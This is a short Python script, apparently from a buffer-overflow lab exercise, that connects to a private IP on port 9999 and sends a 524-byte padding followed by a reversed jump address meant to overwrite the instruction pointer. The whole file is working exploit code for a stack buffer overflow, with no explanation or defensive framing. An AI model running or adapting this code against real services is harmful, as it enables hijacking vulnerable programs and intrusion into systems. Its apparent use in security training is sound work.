import socket, time, sys
ip = '10.10.231.81'
port = 9999
offset = 524
#311712F3 (Put it in reverse for x86)
jmp = b"A" * offset + b"\xf3\x12\x17\x31"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((ip, port))
    s.send((jmp + b'\r\n'))
    s.close()
    print("Done")
except:
    print("Cannot connect to client")